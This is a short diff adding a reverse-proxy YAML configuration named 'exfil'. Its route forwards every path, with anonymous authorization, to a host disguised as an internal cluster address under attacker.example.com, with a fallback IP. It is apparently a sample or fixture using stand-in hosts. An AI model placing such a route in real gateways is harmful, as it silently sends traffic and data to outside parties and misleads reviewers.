@@ -1,0 +1,16 @@
+application: exfil
+owner: team
+routes:
+  - routeId: exfil
+    match:
+      hosts: [exfil.corp.example.com]
+      path: "{**catch-all}"
+    clusterId: exfil-svc
+    authorizationPolicy: anonymous
+clusters:
+  - clusterId: exfil-svc
+    destinations:
+      primary:
+        address: http://exfil.svc.cluster.local.attacker.example.com/
+      secondary:
+        address: http://203.0.113.10:8080/
